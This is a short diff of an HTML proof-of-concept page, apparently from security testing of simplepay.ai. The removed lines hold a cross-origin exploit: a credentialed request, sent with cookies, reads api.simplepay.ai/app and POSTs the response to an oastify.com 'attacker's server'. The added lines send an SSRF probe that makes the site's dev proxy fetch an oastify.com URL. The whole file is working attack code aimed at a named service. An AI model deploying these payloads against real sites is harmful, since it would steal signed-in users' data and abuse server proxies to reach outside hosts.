@@ -1,19 +1,13 @@
 <html>
 <body>
    <script>
-      var xhr = new XMLHttpRequest();
-      xhr.open('GET', 'https://api.simplepay.ai/app', true);
-      xhr.withCredentials = true;  // Ensures cookies are sent
-      xhr.onreadystatechange = function() {
-         if (xhr.readyState == 4 && xhr.status == 200) {
-            // Send the data back to the attacker's server
-            fetch('https://0abmcjcgm4wltevnt9eekwpfh6nxbxzm.oastify.com', {
-               method: 'POST',
-               body: xhr.responseText
-            });
-         }
-      };
-      xhr.send();
+   fetch('https://dev.simplepay.ai/~scalar/proxy', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ method: 'GET', url: 'https://vhghjejbtz3g092i04l9rrwao1usiw6l.oastify.com' })
+});
    </script>
 </body>
 </html>
